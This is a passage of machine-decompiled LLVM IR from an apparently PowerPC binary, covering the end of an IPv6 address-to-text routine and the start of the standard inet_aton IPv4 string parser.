  %v1_1001dc7c = load i32, i32* @r30, align 4
  %v3_1001dc7c = icmp sgt i32 %v0_1001dc88.pre, %v1_1001dc7c
  %or.cond = or i1 %v3_1001dc74, %v3_1001dc7c
  br i1 %or.cond, label %dec_label_pc_1001dc84, label %dec_label_pc_1001dc8c

dec_label_pc_1001dc84:                            ; preds = %dec_label_pc_1001dc74
  store i32 %v0_1001dc84, i32* @r28, align 4
  store i32 %v0_1001dc88.pre, i32* @r30, align 4
  br label %dec_label_pc_1001dc8c

dec_label_pc_1001dc8c:                            ; preds = %dec_label_pc_1001dc74, %dec_label_pc_1001dc84
  %v0_1001dc7440 = phi i32 [ %v0_1001dc84, %dec_label_pc_1001dc84 ], [ %v0_1001dc74, %dec_label_pc_1001dc74 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001dc90

dec_label_pc_1001dc90:                            ; preds = %dec_label_pc_1001dc70, %dec_label_pc_1001dc68, %dec_label_pc_1001dc5c, %dec_label_pc_1001dc8c
  %v0_1001dc8442 = phi i32 [ %v0_1001dc84, %dec_label_pc_1001dc70 ], [ %v0_1001dc84, %dec_label_pc_1001dc68 ], [ %v0_1001dc90, %dec_label_pc_1001dc5c ], [ -1, %dec_label_pc_1001dc8c ]
  %v0_1001dc4835 = phi i32 [ -1, %dec_label_pc_1001dc70 ], [ %v0_1001dc48, %dec_label_pc_1001dc68 ], [ %v0_1001dc90, %dec_label_pc_1001dc5c ], [ -1, %dec_label_pc_1001dc8c ]
  %v0_1001dc7439 = phi i32 [ %v0_1001dc74, %dec_label_pc_1001dc70 ], [ %v0_1001dc74, %dec_label_pc_1001dc68 ], [ %v0_1001dc74, %dec_label_pc_1001dc5c ], [ %v0_1001dc7440, %dec_label_pc_1001dc8c ]
  %v1_1001dc90 = add nuw nsw i32 %v0_1001dc90, 1
  store i32 %v1_1001dc90, i32* %r11.global-to-local, align 4
  %v1_1001dc94 = add nsw i32 %v0_1001dc94, -1
  store i32 %v1_1001dc94, i32* %ctr.global-to-local, align 4
  %v2_1001dc94 = icmp eq i32 %v1_1001dc94, 0
  br i1 %v2_1001dc94, label %dec_label_pc_1001dc98, label %dec_label_pc_1001dc44

dec_label_pc_1001dc98:                            ; preds = %dec_label_pc_1001dc90
  %v3_1001dc98 = icmp eq i32 %v0_1001dc8442, -1
  %v1_1001dcb8 = icmp slt i32 %v0_1001dc7439, -1
  %v3_1001dcb8 = icmp eq i32 %v0_1001dc7439, -1
  store i1 %v1_1001dcb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dc98, label %dec_label_pc_1001dcb8, label %dec_label_pc_1001dca0

dec_label_pc_1001dca0:                            ; preds = %dec_label_pc_1001dc98
  %v0_1001dcb0.pre = load i32, i32* @r31, align 4
  br i1 %v3_1001dcb8, label %dec_label_pc_1001dcb0, label %dec_label_pc_1001dca8

dec_label_pc_1001dca8:                            ; preds = %dec_label_pc_1001dca0
  %v1_1001dca8 = load i32, i32* @r30, align 4
  %v2_1001dca8 = icmp slt i32 %v0_1001dcb0.pre, %v1_1001dca8
  %v3_1001dca8 = icmp sgt i32 %v0_1001dcb0.pre, %v1_1001dca8
  %v4_1001dca8 = icmp eq i32 %v0_1001dcb0.pre, %v1_1001dca8
  store i1 %v2_1001dca8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dca8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dca8, label %dec_label_pc_1001dcb0, label %dec_label_pc_1001dcb8.thread

dec_label_pc_1001dcb0:                            ; preds = %dec_label_pc_1001dca0, %dec_label_pc_1001dca8
  store i32 %v0_1001dcb0.pre, i32* @r30, align 4
  store i32 %v0_1001dc8442, i32* @r28, align 4
  br label %dec_label_pc_1001dcb8.thread

dec_label_pc_1001dcb8.thread:                     ; preds = %dec_label_pc_1001dcb0, %dec_label_pc_1001dca8
  %v0_1001dcc076 = phi i32 [ %v1_1001dca8, %dec_label_pc_1001dca8 ], [ %v0_1001dcb0.pre, %dec_label_pc_1001dcb0 ]
  %v0_1001dcb8.ph = phi i32 [ %v0_1001dc7439, %dec_label_pc_1001dca8 ], [ %v0_1001dc8442, %dec_label_pc_1001dcb0 ]
  %v1_1001dcb859 = icmp slt i32 %v0_1001dcb8.ph, -1
  %v3_1001dcb861 = icmp eq i32 %v0_1001dcb8.ph, -1
  store i1 %v1_1001dcb859, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcb861, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001dcc0

dec_label_pc_1001dcb8:                            ; preds = %dec_label_pc_1001dc98
  br i1 %v3_1001dcb8, label %dec_label_pc_1001dccc, label %dec_label_pc_1001dcb8.dec_label_pc_1001dcc0_crit_edge

dec_label_pc_1001dcb8.dec_label_pc_1001dcc0_crit_edge: ; preds = %dec_label_pc_1001dcb8
  %v0_1001dcc0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001dcc0

dec_label_pc_1001dcc0:                            ; preds = %dec_label_pc_1001dcb8.dec_label_pc_1001dcc0_crit_edge, %dec_label_pc_1001dcb8.thread
  %v0_1001dcc0 = phi i32 [ %v0_1001dcc076, %dec_label_pc_1001dcb8.thread ], [ %v0_1001dcc0.pre, %dec_label_pc_1001dcb8.dec_label_pc_1001dcc0_crit_edge ]
  %v0_1001dcb862 = phi i32 [ %v0_1001dcb8.ph, %dec_label_pc_1001dcb8.thread ], [ %v0_1001dc7439, %dec_label_pc_1001dcb8.dec_label_pc_1001dcc0_crit_edge ]
  %v1_1001dcc0 = icmp slt i32 %v0_1001dcc0, 1
  %v2_1001dcc0 = icmp sgt i32 %v0_1001dcc0, 1
  %v3_1001dcc0 = icmp eq i32 %v0_1001dcc0, 1
  store i1 %v1_1001dcc0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcc0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001dcc0, label %dec_label_pc_1001dccc, label %dec_label_pc_1001dcc8

dec_label_pc_1001dcc8:                            ; preds = %dec_label_pc_1001dcc0
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1001dccc

dec_label_pc_1001dccc:                            ; preds = %dec_label_pc_1001dcc0, %dec_label_pc_1001dcb8, %dec_label_pc_1001dcc8
  %v0_1001dcd83 = phi i32 [ %v0_1001dcb862, %dec_label_pc_1001dcc0 ], [ -1, %dec_label_pc_1001dcb8 ], [ -1, %dec_label_pc_1001dcc8 ]
  %v2_1001dccc = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1001dccc, i32* @r29, align 4
  store i32 0, i32* @r31, align 4
  %v1_1001dcd84 = icmp slt i32 %v0_1001dcd83, -1
  %v3_1001dcd86 = icmp eq i32 %v0_1001dcd83, -1
  store i1 %v1_1001dcd84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcd86, i1* %cr7_eq.global-to-local, align 1
  %v2_1001dd48 = icmp slt i32 %tmp, 65535
  %v4_1001dd48 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1001dcd8

dec_label_pc_1001dcd8:                            ; preds = %dec_label_pc_1001dccc, %dec_label_pc_1001dda4
  %v2_1001dd14 = phi i32 [ %v2_1001dccc, %dec_label_pc_1001dccc ], [ %v2_1001dcfc51, %dec_label_pc_1001dda4 ]
  %v0_1001dce8 = phi i32 [ %v0_1001dcd83, %dec_label_pc_1001dccc ], [ %v0_1001dcd8, %dec_label_pc_1001dda4 ]
  %v0_1001dd08 = phi i32 [ 0, %dec_label_pc_1001dccc ], [ %v1_1001dda4, %dec_label_pc_1001dda4 ]
  %v3_1001dcd87 = phi i1 [ %v3_1001dcd86, %dec_label_pc_1001dccc ], [ %v3_1001dcd8, %dec_label_pc_1001dda4 ]
  br i1 %v3_1001dcd87, label %dec_label_pc_1001dd08, label %dec_label_pc_1001dce0

dec_label_pc_1001dce0:                            ; preds = %dec_label_pc_1001dcd8
  %v2_1001dce0 = icmp slt i32 %v0_1001dd08, %v0_1001dce8
  %v4_1001dce0 = icmp eq i32 %v0_1001dd08, %v0_1001dce8
  br i1 %v2_1001dce0, label %dec_label_pc_1001dd08, label %dec_label_pc_1001dce8

dec_label_pc_1001dce8:                            ; preds = %dec_label_pc_1001dce0
  %v1_1001dce8 = load i32, i32* @r30, align 4
  %v2_1001dce8 = add i32 %v1_1001dce8, %v0_1001dce8
  %v2_1001dcec = icmp slt i32 %v0_1001dd08, %v2_1001dce8
  %v4_1001dcec = icmp eq i32 %v0_1001dd08, %v2_1001dce8
  store i1 %v2_1001dcec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dcec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001dcec, label %dec_label_pc_1001dcf4, label %dec_label_pc_1001dd08

dec_label_pc_1001dcf4:                            ; preds = %dec_label_pc_1001dce8
  br i1 %v4_1001dce0, label %dec_label_pc_1001dcf8, label %dec_label_pc_1001dda4

dec_label_pc_1001dcf8:                            ; preds = %dec_label_pc_1001dcf4
  %v3_1001dcfc = inttoptr i32 %v2_1001dd14 to i8*
  store i8 58, i8* %v3_1001dcfc, align 1
  %v0_1001dd00 = load i32, i32* @r29, align 4
  %v1_1001dd00 = add i32 %v0_1001dd00, 1
  store i32 %v1_1001dd00, i32* @r29, align 4
  br label %dec_label_pc_1001dda4

dec_label_pc_1001dd08:                            ; preds = %dec_label_pc_1001dce8, %dec_label_pc_1001dce0, %dec_label_pc_1001dcd8
  %v1_1001dd08 = icmp slt i32 %v0_1001dd08, 0
  %v3_1001dd08 = icmp eq i32 %v0_1001dd08, 0
  store i1 %v1_1001dd08, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd08, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd08, label %dec_label_pc_1001dd1c.thread, label %dec_label_pc_1001dd1c

dec_label_pc_1001dd1c.thread:                     ; preds = %dec_label_pc_1001dd08
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001dd80

dec_label_pc_1001dd1c:                            ; preds = %dec_label_pc_1001dd08
  %v3_1001dd14 = inttoptr i32 %v2_1001dd14 to i8*
  store i8 58, i8* %v3_1001dd14, align 1
  %v0_1001dd18 = load i32, i32* @r29, align 4
  %v1_1001dd18 = add i32 %v0_1001dd18, 1
  store i32 %v1_1001dd18, i32* %r29.global-to-local, align 4
  %v0_1001dd1c.pre = load i32, i32* @r31, align 4
  %v1_1001dd1c = icmp slt i32 %v0_1001dd1c.pre, 6
  %v3_1001dd1c = icmp eq i32 %v0_1001dd1c.pre, 6
  store i1 %v1_1001dd1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd1c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd1c, label %dec_label_pc_1001dd24, label %dec_label_pc_1001dd80

dec_label_pc_1001dd24:                            ; preds = %dec_label_pc_1001dd1c
  %v0_1001dd24 = load i32, i32* @r28, align 4
  %v1_1001dd24 = icmp slt i32 %v0_1001dd24, 0
  %v3_1001dd24 = icmp eq i32 %v0_1001dd24, 0
  store i1 %v1_1001dd24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd24, label %dec_label_pc_1001dd2c, label %dec_label_pc_1001dd80

dec_label_pc_1001dd2c:                            ; preds = %dec_label_pc_1001dd24
  %v0_1001dd2c = load i32, i32* @r30, align 4
  %v1_1001dd2c = icmp slt i32 %v0_1001dd2c, 6
  %v3_1001dd2c = icmp eq i32 %v0_1001dd2c, 6
  store i1 %v1_1001dd2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd2c, label %dec_label_pc_1001dd50, label %dec_label_pc_1001dd34

dec_label_pc_1001dd34:                            ; preds = %dec_label_pc_1001dd2c
  %v1_1001dd34 = icmp slt i32 %v0_1001dd2c, 5
  %v3_1001dd34 = icmp eq i32 %v0_1001dd2c, 5
  store i1 %v1_1001dd34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd34, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd34, label %dec_label_pc_1001dd3c, label %dec_label_pc_1001dd80

dec_label_pc_1001dd3c:                            ; preds = %dec_label_pc_1001dd34
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1001dd48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dd48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001dd48, label %dec_label_pc_1001dd50, label %dec_label_pc_1001dd80

dec_label_pc_1001dd50:                            ; preds = %dec_label_pc_1001dd3c, %dec_label_pc_1001dd2c
  %v1_1001dd50 = load i32, i32* @r1, align 4
  %v2_1001dd50 = sub i32 %v1_1001dd50, %v1_1001dd18
  %v0_1001dd54 = load i32, i32* @r27, align 4
  %v1_1001dd54 = add i32 %v0_1001dd54, 12
  %v1_1001dd58 = add i32 %v2_1001dd50, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1001dd64.1205 to i32), i32* @lr, align 4
  %v3_1001dd60 = call i32 @inet_ntop4(i32 %v1_1001dd54, i32 %v1_1001dd18, i32 %v1_1001dd58)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1001dd68 = icmp slt i32 %v3_1001dd60, 0
  %v3_1001dd68 = icmp eq i32 %v3_1001dd60, 0
  store i1 %v1_1001dd68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd68, label %dec_label_pc_1001de20, label %dec_label_pc_1001dd70

dec_label_pc_1001dd70:                            ; preds = %dec_label_pc_1001dd50
  %v0_1001dd70 = load i32, i32* @r29, align 4
  store i32 %v0_1001dd70, i32* @r3, align 4
  %v0_1001dd74 = call i32 @__GI_strlen()
  %v0_1001dd78 = load i32, i32* @r29, align 4
  %v2_1001dd78 = add i32 %v0_1001dd78, %v0_1001dd74
  store i32 %v2_1001dd78, i32* @r29, align 4
  %v0_1001ddb8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001ddb8

dec_label_pc_1001dd80:                            ; preds = %dec_label_pc_1001dd1c.thread, %dec_label_pc_1001dd3c, %dec_label_pc_1001dd34, %dec_label_pc_1001dd24, %dec_label_pc_1001dd1c
  %v0_1001dd5c66 = phi i32 [ %v2_1001dd14, %dec_label_pc_1001dd1c.thread ], [ %v1_1001dd18, %dec_label_pc_1001dd3c ], [ %v1_1001dd18, %dec_label_pc_1001dd34 ], [ %v1_1001dd18, %dec_label_pc_1001dd24 ], [ %v1_1001dd18, %dec_label_pc_1001dd1c ]
  store i32 %v2_1001dbd8, i32* %r9.global-to-local, align 4
  store i32 %v0_1001dd5c66, i32* @r3, align 4
  store i32 268557728, i32* @lr, align 4
  %v1_1001dd9c = call i32 @sprintf(i32 %v0_1001dd5c66)
  %v0_1001dda0 = load i32, i32* @r29, align 4
  %v2_1001dda0 = add i32 %v0_1001dda0, %v1_1001dd9c
  store i32 %v2_1001dda0, i32* @r29, align 4
  br label %dec_label_pc_1001dda4

dec_label_pc_1001dda4:                            ; preds = %dec_label_pc_1001dcf4, %dec_label_pc_1001dcf8, %dec_label_pc_1001dd80
  %v2_1001dcfc51 = phi i32 [ %v2_1001dd14, %dec_label_pc_1001dcf4 ], [ %v1_1001dd00, %dec_label_pc_1001dcf8 ], [ %v2_1001dda0, %dec_label_pc_1001dd80 ]
  %v0_1001dda4 = load i32, i32* @r31, align 4
  %v1_1001dda4 = add i32 %v0_1001dda4, 1
  store i32 %v1_1001dda4, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1001dda4, 8
  %v0_1001dcd8 = load i32, i32* @r28, align 4
  %v1_1001dcd8 = icmp slt i32 %v0_1001dcd8, -1
  %v3_1001dcd8 = icmp eq i32 %v0_1001dcd8, -1
  store i1 %v1_1001dcd8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcd8, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1001dcd8, label %dec_label_pc_1001ddb0

dec_label_pc_1001ddb0:                            ; preds = %dec_label_pc_1001dda4
  br i1 %v3_1001dcd8, label %dec_label_pc_1001ddd0, label %dec_label_pc_1001ddb8

dec_label_pc_1001ddb8:                            ; preds = %dec_label_pc_1001ddb0, %dec_label_pc_1001dd70
  %v2_1001ddc8 = phi i32 [ %v2_1001dcfc51, %dec_label_pc_1001ddb0 ], [ %v2_1001dd78, %dec_label_pc_1001dd70 ]
  %v0_1001ddb8 = phi i32 [ %v0_1001dcd8, %dec_label_pc_1001ddb0 ], [ %v0_1001ddb8.pre, %dec_label_pc_1001dd70 ]
  %v1_1001ddb8 = load i32, i32* @r30, align 4
  %v2_1001ddb8 = add i32 %v1_1001ddb8, %v0_1001ddb8
  %v1_1001ddbc = icmp slt i32 %v2_1001ddb8, 8
  %v3_1001ddbc = icmp eq i32 %v2_1001ddb8, 8
  store i1 %v1_1001ddbc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001ddbc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001ddbc, label %dec_label_pc_1001ddc4, label %dec_label_pc_1001ddd0

dec_label_pc_1001ddc4:                            ; preds = %dec_label_pc_1001ddb8
  %v3_1001ddc8 = inttoptr i32 %v2_1001ddc8 to i8*
  store i8 58, i8* %v3_1001ddc8, align 1
  %v0_1001ddcc = load i32, i32* @r29, align 4
  %v1_1001ddcc = add i32 %v0_1001ddcc, 1
  store i32 %v1_1001ddcc, i32* @r29, align 4
  br label %dec_label_pc_1001ddd0

dec_label_pc_1001ddd0:                            ; preds = %dec_label_pc_1001ddb8, %dec_label_pc_1001ddb0, %dec_label_pc_1001ddc4
  %v2_1001dde4 = phi i32 [ %v2_1001ddc8, %dec_label_pc_1001ddb8 ], [ %v2_1001dcfc51, %dec_label_pc_1001ddb0 ], [ %v1_1001ddcc, %dec_label_pc_1001ddc4 ]
  %v1_1001ddd0 = sub i32 1, %v2_1001dccc
  %v2_1001ddd8 = add i32 %v1_1001ddd0, %v2_1001dde4
  %v1_1001dddc = load i32, i32* @r26, align 4
  %v2_1001dddc = icmp ult i32 %v2_1001ddd8, %v1_1001dddc
  %v4_1001dddc = icmp eq i32 %v2_1001ddd8, %v1_1001dddc
  store i1 %v2_1001dddc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dddc, i1* %cr7_eq.global-to-local, align 1
  %v3_1001dde4 = inttoptr i32 %v2_1001dde4 to i8*
  store i8 0, i8* %v3_1001dde4, align 1
  %v0_1001dde8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1001dde8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1001dde8 = or i1 %v0_1001dde8, %v1_1001dde8
  br i1 %v2_1001dde8, label %dec_label_pc_1001de00, label %dec_label_pc_1001ddec

dec_label_pc_1001ddec:                            ; preds = %dec_label_pc_1001ddd0
  %v0_1001ddec = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001ddf8 = inttoptr i32 %v0_1001ddec to i32*
  store i32 28, i32* %v2_1001ddf8, align 4
  %v0_1001de24.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001de20

dec_label_pc_1001de00:                            ; preds = %dec_label_pc_1001ddd0
  %v0_1001de00 = load i32, i32* @r25, align 4
  %v2_1001de04 = bitcast i32* %stack_var_-88 to i8*
  %v3_1001de04 = call i32 @strcpy(i32 %v0_1001de00, i8* %v2_1001de04)
  br label %dec_label_pc_1001de08

dec_label_pc_1001de08:                            ; preds = %dec_label_pc_1001dbc4, %dec_label_pc_1001de00
  %storemerge1 = phi i32 [ %v3_1001dbd0, %dec_label_pc_1001dbc4 ], [ %v3_1001de04, %dec_label_pc_1001de00 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001de20

dec_label_pc_1001de10:                            ; preds = %dec_label_pc_1001dbb8
  %v0_1001de10 = call i32 @__errno_location()
  %v2_1001de18 = inttoptr i32 %v0_1001de10 to i32*
  store i32 97, i32* %v2_1001de18, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001de20

dec_label_pc_1001de20:                            ; preds = %dec_label_pc_1001dd50, %dec_label_pc_1001de08, %dec_label_pc_1001ddec, %dec_label_pc_1001de10
  %v0_1001de24 = phi i32 [ 0, %dec_label_pc_1001dd50 ], [ %storemerge1, %dec_label_pc_1001de08 ], [ %v0_1001de24.pre, %dec_label_pc_1001ddec ], [ 0, %dec_label_pc_1001de10 ]
  ret i32 %v0_1001de24

; uselistorder directives
  uselistorder i32 %v2_1001dde4, { 1, 0 }
  uselistorder i32 %v2_1001ddb8, { 1, 0 }
  uselistorder i1 %v3_1001dcd8, { 0, 2, 1 }
  uselistorder i32 %v0_1001dcd8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1001dda4, { 2, 1, 0 }
  uselistorder i32 %v0_1001dd5c66, { 1, 0 }
  uselistorder i32 %v3_1001dd60, { 1, 0 }
  uselistorder i32 %v0_1001dd2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1001dd18, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1001dce8, { 1, 0 }
  uselistorder i32 %v0_1001dd08, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1001dce8, { 0, 2, 1 }
  uselistorder i32 %v2_1001dd14, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1001dcd83, { 0, 2, 1 }
  uselistorder i32 %v0_1001dcc0, { 2, 1, 0 }
  uselistorder i32 %v0_1001dcb0.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1001dcb8, { 1, 0, 2 }
  uselistorder i32 %v1_1001dc94, { 2, 1, 0 }
  uselistorder i32 %v1_1001dc90, { 1, 0 }
  uselistorder i32 %v0_1001dc7439, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1001dc8442, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1001dc48, { 1, 0 }
  uselistorder i32 %v0_1001dc90, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1001dc48, { 1, 0 }
  uselistorder i32 %v0_1001dc74, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1001dc84, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1001dc24, { 1, 0 }
  uselistorder i32 %v2_1001dc1c, { 1, 0 }
  uselistorder i32 %v0_1001dc14, { 1, 0, 2 }
  uselistorder i32 %v1_1001dbfc, { 1, 0 }
  uselistorder i32 %v2_1001dbd8, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %ctr.global-to-local, { 2, 0, 4, 3, 1 }
  uselistorder i1* %cr7_lt.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 10, 11, 2, 12, 13, 0, 15, 1, 17, 16, 18, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 10, 11, 2, 12, 13, 0, 15, 1, 17, 16, 18, 19 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1001de20, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001de08, { 1, 0 }
  uselistorder label %dec_label_pc_1001ddd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001dda4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001dd80, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1001dcd8, { 1, 0 }
  uselistorder label %dec_label_pc_1001dccc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001dcb0, { 1, 0 }
  uselistorder label %dec_label_pc_1001dc90, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001dc8c, { 1, 0 }
  uselistorder label %dec_label_pc_1001dc44, { 1, 0 }
  uselistorder label %dec_label_pc_1001dbfc, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1001de38 = icmp eq i8* %arg1, null
  br i1 %v3_1001de38, label %dec_label_pc_1001def0, label %dec_label_pc_1001de40

dec_label_pc_1001de40:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1001de54.pre = load i32, i32* @global_var_1004515c, align 4
  br label %dec_label_pc_1001de50

dec_label_pc_1001de50:                            ; preds = %dec_label_pc_1001de40, %dec_label_pc_1001dec8
  %v0_1001dec8 = phi i32 [ 0, %dec_label_pc_1001de40 ], [ %v2_1001ded0, %dec_label_pc_1001dec8 ]
  %v0_1001decc = phi i32 [ 1, %dec_label_pc_1001de40 ], [ %v1_1001decc, %dec_label_pc_1001dec8 ]
  %v0_1001de50 = phi i32 [ %tmp, %dec_label_pc_1001de40 ], [ %v0_1001de503, %dec_label_pc_1001dec8 ]
  %v1_1001de50 = inttoptr i32 %v0_1001de50 to i8*
  %v2_1001de50 = load i8, i8* %v1_1001de50, align 1
  %v3_1001de50 = zext i8 %v2_1001de50 to i32
  %v1_1001de58 = mul nuw nsw i32 %v3_1001de50, 2
  %v2_1001de5c = add i32 %v1_1001de58, %v3_1001de54.pre
  %v3_1001de5c = inttoptr i32 %v2_1001de5c to i16*
  %v4_1001de5c = load i16, i16* %v3_1001de5c, align 2
  %v1_1001de60 = and i16 %v4_1001de5c, 8
  %v3_1001de60 = icmp eq i16 %v1_1001de60, 0
  br i1 %v3_1001de60, label %dec_label_pc_1001def0, label %dec_label_pc_1001de68

dec_label_pc_1001de68:                            ; preds = %dec_label_pc_1001de50
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1001de80

dec_label_pc_1001de70:                            ; preds = %dec_label_pc_1001de80
  %v1_1001de70 = add i32 %v2_1001de8c, -48
  store i32 %v1_1001de70, i32* @r8, align 4
  %v1_1001de74 = add i32 %v0_1001deb8, 1
  %v2_1001de78 = icmp sgt i32 %v1_1001de70, 255
  br i1 %v2_1001de78, label %dec_label_pc_1001def0, label %dec_label_pc_1001de80

dec_label_pc_1001de80:                            ; preds = %dec_label_pc_1001de70, %dec_label_pc_1001de68
  %v1_1001ded0 = phi i32 [ %v1_1001de70, %dec_label_pc_1001de70 ], [ 0, %dec_label_pc_1001de68 ]
  %v0_1001deb8 = phi i32 [ %v1_1001de74, %dec_label_pc_1001de70 ], [ %v0_1001de50, %dec_label_pc_1001de68 ]
  %v1_1001de80 = inttoptr i32 %v0_1001deb8 to i8*
  %v2_1001de80 = load i8, i8* %v1_1001de80, align 1
  %v3_1001de80 = zext i8 %v2_1001de80 to i32
  %v1_1001de84 = mul i32 %v1_1001ded0, 10
  %v1_1001de88 = mul nuw nsw i32 %v3_1001de80, 2
  %v2_1001de8c = add i32 %v3_1001de80, %v1_1001de84
  store i32 %v2_1001de8c, i32* @r10, align 4
  %v2_1001de90 = add i32 %v1_1001de88, %v3_1001de54.pre
  %v3_1001de90 = inttoptr i32 %v2_1001de90 to i16*
  %v4_1001de90 = load i16, i16* %v3_1001de90, align 2
  %v5_1001de90 = zext i16 %v4_1001de90 to i32
  %v1_1001de94 = and i32 %v5_1001de90, 8
  %v3_1001de94 = icmp eq i32 %v1_1001de94, 0
  br i1 %v3_1001de94, label %dec_label_pc_1001de9c, label %dec_label_pc_1001de70

dec_label_pc_1001de9c:                            ; preds = %dec_label_pc_1001de80
  %v2_1001de9c = icmp sgt i32 %v0_1001decc, 3
  br i1 %v2_1001de9c, label %dec_label_pc_1001deb4, label %dec_label_pc_1001dea4

dec_label_pc_1001dea4:                            ; preds = %dec_label_pc_1001de9c
  %v3_1001dea4 = icmp eq i8 %v2_1001de80, 46
  br i1 %v3_1001dea4, label %dec_label_pc_1001deac, label %dec_label_pc_1001def0

dec_label_pc_1001deac:                            ; preds = %dec_label_pc_1001dea4
  %v1_1001deac = add i32 %v0_1001deb8, 1
  br label %dec_label_pc_1001dec8

dec_label_pc_1001deb4:                            ; preds = %dec_label_pc_1001de9c
  %v3_1001deb4 = icmp eq i8 %v2_1001de80, 0
  %v1_1001deb8 = add i32 %v0_1001deb8, 1
  br i1 %v3_1001deb4, label %dec_label_pc_1001dec8, label %dec_label_pc_1001dec0

dec_label_pc_1001dec0:                            ; preds = %dec_label_pc_1001deb4
  %v1_1001dec0 = and i32 %v5_1001de90, 32
  %v3_1001dec0 = icmp eq i32 %v1_1001dec0, 0
  br i1 %v3_1001dec0, label %dec_label_pc_1001def0, label %dec_label_pc_1001dec8

dec_label_pc_1001dec8:                            ; preds = %dec_label_pc_1001dec0, %dec_label_pc_1001deb4, %dec_label_pc_1001deac
  %v0_1001de503 = phi i32 [ %v1_1001deb8, %dec_label_pc_1001dec0 ], [ %v1_1001deb8, %dec_label_pc_1001deb4 ], [ %v1_1001deac, %dec_label_pc_1001deac ]
  %v1_1001dec8 = mul i32 %v0_1001dec8, 256
  %v1_1001decc = add nuw nsw i32 %v0_1001decc, 1
  %v2_1001ded0 = or i32 %v1_1001ded0, %v1_1001dec8
  store i32 %v2_1001ded0, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1001decc, 5
  br i1 %tmp10, label %dec_label_pc_1001de50, label %dec_label_pc_1001dedc

